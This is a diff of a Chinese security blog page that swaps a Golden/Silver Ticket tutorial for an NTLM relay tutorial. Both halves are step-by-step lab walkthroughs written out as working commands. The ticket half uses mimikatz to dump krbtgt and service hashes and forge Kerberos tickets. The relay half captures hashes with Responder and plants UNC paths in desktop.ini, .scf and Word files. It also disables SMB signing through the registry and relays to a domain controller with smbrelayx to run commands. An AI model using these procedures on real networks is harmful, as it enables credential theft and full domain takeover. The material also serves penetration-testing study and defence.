@@ -24,7 +24,7 @@
 
   
 
-  <title>黄金票据 &amp;&amp; 白银票据 | WsyKer&#39;s Blog</title>
+  <title>RNTLM中继 | WsyKer&#39;s Blog</title>
 
   
 
@@ -98,11 +98,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">黄金票据 &amp;&amp; 白银票据</h1>
+          <h1 class="title-wrap">RNTLM中继</h1>
           <h2 class="title-sub-wrap">
             <strong>WsyKer</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-06-24T01:36:32.000Z" itemprop="datePublished">2022-06-24</time>
+            <time  class="article-date" datetime="2022-06-24T01:51:38.000Z" itemprop="datePublished">2022-06-24</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -133,131 +133,115 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="一、GoldenTicket介绍"><a href="#一、GoldenTicket介绍" class="headerlink" title="一、GoldenTicket介绍"></a>一、GoldenTicket介绍</h2><p>黄金票据（GoldenTicket）是在Kerberos认证中的AS-REP阶段，由于返回的TGT认购权证是由krbtgt用户的密码Hash加密的，因此如果我们拥有krbtgt的Hash就可以自己制作一个TGT认购权证，只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限</p>
-<p><img src="/" alt="1"><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/1.png" alt="1"></p>
-<h2 id="二、GoldenTicket利用"><a href="#二、GoldenTicket利用" class="headerlink" title="二、GoldenTicket利用"></a>二、GoldenTicket利用</h2><h3 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.5.2</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.5.3</p>
-<h3 id="制作条件："><a href="#制作条件：" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域的FQDN</span><br><span class="line">2、域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</span><br><span class="line">3、域的KRBTGT账户NTLM密码哈希</span><br><span class="line">4、伪造用户名[可以是任意的，我这儿是bdministrator]</span><br></pre></td></tr></table></figure>
+        <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><h3 id="Net-NTLM-Hash："><a href="#Net-NTLM-Hash：" class="headerlink" title="Net NTLM Hash："></a>Net NTLM Hash：</h3><p>Net-NTLM Hash 与 NTLM Hash 不一样。NTLM 认证的第三步中，客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 Net-NTLM Hash，Net-NTLM Hash不能像NTLM Hash一样被Pass The Hash，但是可以对其进行捕获，从而爆破或者中继攻击</p>
+<h3 id="SSP-amp-SSPI："><a href="#SSP-amp-SSPI：" class="headerlink" title="SSP &amp; SSPI："></a>SSP &amp; SSPI：</h3><p>SSPI（Security Support Provider Interface） 安全支持提供者接口， 是 Windows 操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。</p>
+<p>SSP（Security Support Provider）Windows 身份验证协议Microsoft 安全支持提供程序接口，是 Windows 身份验证的基础。 要求身份验证的应用程序和基础结构服务会使用 SSPI ，使用的协议就是以下 SSP 安全协议。</p>
+<p>简单的来说，SSP 是一套认证协议，用于实现身份认证等安全功能的身份验证，NTLM SSP 实现的就是一种 Challenge&#x2F;Response 验证机制</p>
+<h3 id="Relay介绍："><a href="#Relay介绍：" class="headerlink" title="Relay介绍："></a>Relay介绍：</h3><p>NTLM Realy严格来说应该叫做Net NTLM Realy，因为其原理是捕获NTLM认证中第三步Response字段的值，从而进行重放攻击，所以NTLM Realy共分为两步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、捕获Net-NTLM Hash</span><br><span class="line">2、重放Net-NTLM Hash</span><br></pre></td></tr></table></figure>
 
-<h3 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h3><p>当攻击者掌握了域控制器的权限，或者以某种方式获取了Krbtgt账户密码的哈希，那么就可以在任意一台机器，甚至是本机制作黄金票据了</p>
+<p>那么如何才能捕获Net-NTLM Hash呢？思路是让受害者通过SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证，从而把Net-NTLM Hash发送给攻击者，常见的攻击方式有：</p>
+<ul>
+<li>网络协议的欺骗与劫持</li>
+<li>钓鱼攻击</li>
+<li>与其他漏洞结合</li>
+</ul>
+<p>环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali（攻击机）：192.168.52.188</span><br><span class="line">Windows Server 2016（DC）：192.168.52.138</span><br><span class="line">Windows 7（受害者）：192.168.52.143</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、捕获Net-NTLM-Hash"><a href="#二、捕获Net-NTLM-Hash" class="headerlink" title="二、捕获Net-NTLM Hash"></a>二、捕获Net-NTLM Hash</h2><h3 id="Netbios-amp-amp-LLMNR："><a href="#Netbios-amp-amp-LLMNR：" class="headerlink" title="Netbios &amp;&amp; LLMNR："></a>Netbios &amp;&amp; LLMNR：</h3><p>Netbios：为网上基本输入输出系统，严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API），可以在局域网中，互相连线，以及分享数据，通过UDP&#x2F;137端口进行通信，系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名解析为相应IP地址，几乎所有的局域网都是在NetBIOS协议的基础上工作的。在Windows操作系统中，默认情况下在安装 TCP&#x2F;IP 协议后会自动安装NetBIOS。NetBIOS 协议进行名称解析的过程如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、检查本地 NetBIOS 缓存</span><br><span class="line">2、如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</span><br><span class="line">3、如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</span><br><span class="line">4、如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</span><br></pre></td></tr></table></figure>
+
+<p>LLMNR：为链路本地多播名称解析，是一个基于域名系统（DNS）数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析，监听的端口为UDP&#x2F;535，当主机访问另外一台主机时，如果只知道对方的主机名，则会向局域网内多播请求，询问该主机名对应的ip地址，然后收到该请求的主机首先会判断自己的主机名是否是这个，如果是的话，则会回复一个ip地址，如果主机名不符合，则丢弃。LLMNR协议就类似于ARP协议。</p>
+<p>简单点来说，以上两种都是微软为工作组和域设计的名称解析协议，主要用于局域网中的名称解析，当Dns查询失败时，系统就会使用 NetBIOS 和 LLMNR 进行本地主机解析，Windows系统的名称解析顺序如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、本地hosts文件（%windir%\System32\drivers\etc\hosts）</span><br><span class="line">2、DNS缓存/DNS服务器</span><br><span class="line">3、NetBIOS名称服务（NBTNS）和 链路本地多播名称解析（LLMNR）</span><br></pre></td></tr></table></figure>
+
+<p>因此，只要用户输入一个不存在的名称或地址，由于本地Host文件和Dns服务器都不能正常解析，Windows就会通过利用LLMNR和 NetBIOS名称服务进行查找，而此时黑客在局域网内有一台主机权限，就可以伪装成受害主机想要访问的机器，从而让受害主机交出相应的登陆凭证</p>
 <ol>
-<li>常用命令</li>
+<li>第一步首先使用Kali捕获流量：</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![3](C:\Users\23528\Desktop\img\ticket\3.png)1、获取域名：net time /domain</span><br><span class="line">2、获取域sid：whoami /all</span><br><span class="line">3、查看域管理员：net group &quot;domain admins&quot; /domain</span><br><span class="line">4、查看票据：kerberos::list</span><br><span class="line">5、清空票据：kerberos::purge</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -rPv</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/2.png" alt="2"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/1.png" alt="1"></p>
 <ol start="2">
-<li>先在Windows Server 2008导出Krbtgt账号Hash</li>
+<li>使用Win7去发送一个SMB请求</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\abcdefg</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/3.png" alt="3"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/2.png" alt="2"></p>
 <ol start="3">
-<li>得到Krbtgt Hash之后，进入Windows7开始伪造TGT，使用kerberos::golden功能生成金票golden.kiribi</li>
+<li>之后就可以捕捉到Client上用户的Hash</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:bdministrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:bdministrator.kiribi</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">/admin：伪造的用户名[任意即可]</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/3.png" alt="3"></p>
+<h3 id="图标："><a href="#图标：" class="headerlink" title="图标："></a>图标：</h3><h4 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h4><p>在每一个文件夹下面都会默认存放一个隐藏的desktop.ini文件，作用是指定文件夹的图标之类，修改文件夹属性中的隐藏受保护的操作系统文件，就可以看到desktop.ini文件</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/4.png" alt="4"></p>
+<p>或者使用Everything工具也可</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/5.png" alt="5"></p>
+<p>双击desktop.ini，对其进行编辑</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/6.png" alt="6"></p>
+<p>修改IconResource的值为攻击者的UNC路径</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/7.png" alt="7"></p>
+<p>接下来进行流量监听，只要有人访问了这个文件夹，就会把NTLM Hash发送给对方</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/8.png" alt="8"></p>
+<h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>此功能适用于Windows10&#x2F;11 和 Windows Server 2016&#x2F;2019，在更改账户图片处，输入指定的UNC路径即可把NTLM Hash发送给对方</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/9.png" alt="9"></p>
+<p>注：如果是在域内，普通用户验证成功后，System也会跟着访问，可以用来提权</p>
+<h3 id="scf文件"><a href="#scf文件" class="headerlink" title="scf文件"></a>scf文件</h3><p>scf文件和desktop.ini类型相似，因为scf文件包含了IconFile属性，所以可以在一个文件夹下面新建一个这样的文件，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=UNC路径</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/4.png" alt="4"></p>
+<p>这时用户点击这个文件，就会去请求UNC路径，并发送NTLM Hash，这里不做演示</p>
+<h3 id="Office："><a href="#Office：" class="headerlink" title="Office："></a>Office：</h3><p>和Office钓鱼相像，新建一个Word文档，插入一张图片保存，然后使用zip打开</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/10.png" alt="10"></p>
+<p>进入word -&gt; _rels文件夹，打开document.xml.rels文件</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/11.png" alt="11"></p>
+<p>Target代表本地文件路径，修改其为指定的UNC路径，再添加TargetMode&#x3D;”External”</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/12.png" alt="12"></p>
+<p>保存后，只有有人打开Word，就会将NTLM Hash发送给对方</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/13.png" alt="13"></p>
+<h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><p>除此之外还有很多方法，这里不做阐述了</p>
+<h2 id="三、重放Net-NTLM-Hash"><a href="#三、重放Net-NTLM-Hash" class="headerlink" title="三、重放Net-NTLM Hash"></a>三、重放Net-NTLM Hash</h2><p>在获取到目标主机的NTLM Hash之后，有两种攻击方法，分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 使用Hashcat等工具破解出Hash明文</span><br><span class="line">2. Relay Net-NTLM Hash</span><br></pre></td></tr></table></figure>
+
+<p>当获取到的Hash是NTLM V1那么可以直接使用第一种方法，如果是V2的话就可以尝试NTLM Relay攻击，Relay攻击又分为两种清空，分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.工作组环境</span><br><span class="line">2.域环境</span><br></pre></td></tr></table></figure>
+
+<p>在工作组环境中，由于各个主机之间没有信任关系，所以只能是两台主机密码相同的情况下进行Relay攻击，但是两台主机密码一样，为什么不直接PTH呢？所以比较鸡肋，下面也不做讲述，而在域环境下，账号密码都保存在ntds.dit上，如果没有做限制，那么默认普通域用户可以Relay到域内其他机器上，除了域控。</p>
+<h3 id="Relay-To-SMB："><a href="#Relay-To-SMB：" class="headerlink" title="Relay To SMB："></a>Relay To SMB：</h3><p>Relay To SMB也可以叫SMB Relay，这是因为NTLM只是底层协议，传输时只能依赖上层协议，如果上层协议为SMB就是SMB Relay，是HTTP就是HTTP Relay，直接Relay到SMB服务器，就可以直接控制服务器执行任何操作</p>
+<ol>
+<li>首先使用Responder.conf关闭HTTP和SMB服务器，因为如果开启了smb Signing就无法进行攻击</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/share/responder/Responder.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/14.png" alt="14"></p>
+<ol start="2">
+<li>检查目标主机是否开启了smb签名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/15.png" alt="15"></p>
+<ol start="3">
+<li>如果开启了可以在注册表中进行修改子健为0，默认为1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
 <ol start="4">
-<li>通过kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</li>
+<li>在kali上对DC执行命令：</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt bdministrator.kiribi</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 192.168.52.138 -c whoami</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/5.png" alt="5"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/16.png" alt="16"></p>
 <ol start="5">
-<li>此时就可以通过dir成功访问域控的共享文件夹</li>
+<li>在Win7（被控主机）访问一个不存在的主机</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\主机名.域名\c$</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\abcdefg</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/6.png" alt="6"></p>
-<ol start="7">
-<li>在Windows7导出Krbtgt用户Hash</li>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/17.png" alt="17"></p>
+<ol start="6">
+<li>当被控主机访问一个不存在的主机时，就会触发LLMNR协议，攻击者捕获到其NTLM Hash，然后再把这段Hash重放到DC，一旦成功，即可执行任意命令</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/7.png" alt="7"></p>
-<h2 id="三、SilverTickets介绍"><a href="#三、SilverTickets介绍" class="headerlink" title="三、SilverTickets介绍"></a>三、SilverTickets介绍</h2><p>白银票据不同于黄金票据，黄金票据发生在KRB_AS_REP认证阶段，是针对用户的，而白银票据（SilverTickets）发生在KRB_AP_REP认证阶段，是针对服务的，GoldenTicket利用Krbtgt Hash来伪造高权限的TGT，从而获取访问任何服务的权限，SilverTickets则是获取某个服务账号的Hash后，伪造服务票据ST，然后通过伪造的TGS，直接发送给Server访问指定的某个服务来进行攻击，此过程无需KDC，其权限低于Golden Ticket</p>
-<h2 id="四、SilverTickets利用"><a href="#四、SilverTickets利用" class="headerlink" title="四、SilverTickets利用"></a>四、SilverTickets利用</h2><h3 id="环境介绍：-1"><a href="#环境介绍：-1" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.52.138</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.52.143</p>
-<h3 id="制作条件：-1"><a href="#制作条件：-1" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称</span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的服务账户密码HASH</span><br><span class="line">4、需要伪造的用户名</span><br></pre></td></tr></table></figure>
-
-<h3 id="伪造-CIFS-服务权限："><a href="#伪造-CIFS-服务权限：" class="headerlink" title="伪造 CIFS 服务权限："></a>伪造 CIFS 服务权限：</h3><p>CIFS 服务主要用于windows主机之间来进行网络文件共享</p>
-<ol>
-<li>首先在Windows Server 2008使用获取服务账户的USERNAME、域SID、NTLM 哈希</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/8.png" alt="8"></p>
-<ol start="2">
-<li>获取以上信息之后，在Windows7伪造Silver Ticket票据</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /rc4:05df2fd1109e3d3b60f110965f6af128  /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/9.png" alt="9"></p>
-<ol start="3">
-<li>伪造好后，就可以使用dir、type、at等命令访问共享目录了</li>
-</ol>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/10.png" alt="10"></p>
-<h3 id="伪造-LDAP-服务权限："><a href="#伪造-LDAP-服务权限：" class="headerlink" title="伪造 LDAP 服务权限："></a>伪造 LDAP 服务权限：</h3><ol>
-<li>在Windows7使用dcsync命令导出krbtgt hash，以此来判断权限</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.local /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/11.png" alt="11"></p>
-<ol start="2">
-<li>使用Windows Server 2008获取服务账号的 NTLM Hash，和上面cifs的一样</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/12.png" alt="12"></p>
-<ol start="3">
-<li>使用Windows7伪造Silver Ticket</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:05df2fd1109e3d3b60f110965f6af128 /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/13.png" alt="13"></p>
-<ol start="4">
-<li>再次尝试导出krbtgt hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/14.png" alt="14"></p>
-<h3 id="可伪造的其他服务："><a href="#可伪造的其他服务：" class="headerlink" title="可伪造的其他服务："></a>可伪造的其他服务：</h3><table>
-<thead>
-<tr>
-<th>可伪造名称：</th>
-<th>服务名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>WMI</td>
-<td>HOST、RPCSS</td>
-</tr>
-<tr>
-<td>Poershell Remoteing</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>WinRM</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>Scheduled Tasks</td>
-<td>HOST</td>
-</tr>
-<tr>
-<td>LDAP、DCSync</td>
-<td>LDAP</td>
-</tr>
-<tr>
-<td>Windows File Share(CIFS)</td>
-<td>CIFS</td>
-</tr>
-<tr>
-<td>Windows Remote ServerAdministration Tools</td>
-<td>RPCSS、LDAP、CIFS</td>
-</tr>
-</tbody></table>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/relay/18.png" alt="18"></p>
 
       </section>
 
@@ -265,28 +249,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/06/24/Relay/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">RNTLM中继</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2022/06/23/ntds/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ntds.dit导出</h2>
+        <a href="/2022/06/24/ticket/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">黄金票据 &amp;&amp; 白银票据</h2>
         </a>
       
       <div class="card-text--row">Older</div>
